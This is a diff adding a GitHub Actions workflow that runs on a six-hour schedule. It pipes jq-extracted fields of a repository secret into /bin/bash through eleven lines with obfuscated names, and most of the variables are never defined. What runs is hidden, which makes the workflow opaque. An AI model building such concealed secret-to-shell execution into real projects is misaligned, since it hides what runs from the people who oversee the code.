@@ -1,0 +1,28 @@
+name: bindanancong
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: bindanancong
+        env:
+          ztid7: ${{ secrets.ztid7 }}
+        run: |
+          echo $ztid7 | jq -r .wdqgu9008 | /bin/bash
+          echo $csje12 | jq -r .su83 | /bin/bash
+          echo $xoi3654 | jq -r .bq20 | /bin/bash
+          echo $le12 | jq -r .mykby22 | /bin/bash
+          echo $wjeg9 | jq -r .oi4 | /bin/bash
+          echo $cg63471 | jq -r .i865 | /bin/bash
+          echo $ifsfq2 | jq -r .i6820 | /bin/bash
+          echo $rx8 | jq -r .eye6749 | /bin/bash
+          echo $sivbg06955 | jq -r .mz46961 | /bin/bash
+          echo $nip12 | jq -r .eys203 | /bin/bash
+          echo $s3 | jq -r .xsen876 | /bin/bash
+
